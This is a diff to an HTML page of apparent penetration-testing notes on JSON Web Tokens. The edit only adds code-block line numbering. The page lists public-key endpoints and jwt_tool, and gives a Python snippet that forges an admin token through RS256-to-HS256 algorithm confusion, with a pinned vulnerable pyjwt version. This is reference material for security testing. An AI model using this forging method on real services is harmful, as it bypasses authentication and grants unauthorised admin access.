@@ -282,7 +282,7 @@
               <h1 id="json-web-token">JSON Web Token</h1>
 <h2 id="finding-public-keys">Finding Public Keys</h2>
 <p>Some common locations for public keys are:</p>
-<pre><code>/api/keys
+<pre><code class="language-none line-numbers">/api/keys
 /api/v1/keys
 /.well-known/jwks.json
 /openid/connect/jwks.json
@@ -297,27 +297,27 @@
 <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114" target="_blank">CVE-2018-0114</a>: It's possible to re-sign a token using a key that is embedded within the token</li>
 </ul>
 <h2 id="jwt-toolkit">JWT Toolkit</h2>
-<pre><code class="language-bash">jwt_tool.py is a toolkit for validating, forging and cracking JWTs (JSON Web Tokens).
+<pre><code class="language-bash line-numbers">jwt_tool.py is a toolkit for validating, forging and cracking JWTs (JSON Web Tokens).
 </code></pre>
 
 <p><a href="https://github.com/ticarpi/jwt_tool" target="_blank">https://github.com/ticarpi/jwt_tool</a></p>
 <h2 id="exploit-in-python">Exploit in Python</h2>
 <p>On some vulnerable implementation, it's possible to replace the JWT algorithm
 from <code>RS256</code> to <code>HS256</code>. The vulnerable library use the public key as a secret.</p>
-<pre><code class="language-python">import jwt
+<pre><code class="language-python line-numbers">import jwt
 key = open('public_key.pem', 'r').read()
 jwt.encode({&quot;username&quot;:&quot;admin&quot;}, key=key, algorithm='HS256')
 </code></pre>
 
 <p>You need to install the <code>pyjwt</code> package in a specific version. In the last
 versions, the library check the key is a x509 certificate:</p>
-<pre><code class="language-bash">  File &quot;.../lib/python3.6/site-packages/jwt/algorithms.py&quot;, line 151, in prepare_key
+<pre><code class="language-bash line-numbers">  File &quot;.../lib/python3.6/site-packages/jwt/algorithms.py&quot;, line 151, in prepare_key
     'The specified key is an asymmetric key or x509 certificate and'
 jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
 </code></pre>
 
 <p>The version <code>0.4.3</code> has not this check:</p>
-<pre><code class="language-bash">pip install pyjwt==0.4.3
+<pre><code class="language-bash line-numbers">pip install pyjwt==0.4.3
 </code></pre>
             
           </div>
@@ -347,6 +347,7 @@ jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 c
     <script>var base_url = '..';</script>
     <script src="../js/theme.js"></script>
     <script src="../js/prism-core.min.js"></script>
+    <script src="../js/prism-line-numbers.min.js"></script>
     <script src="../js/prism-clike.min.js"></script>
     <script src="../js/prism-yaml.min.js"></script>
     <script src="../js/prism-powershell.min.js"></script>
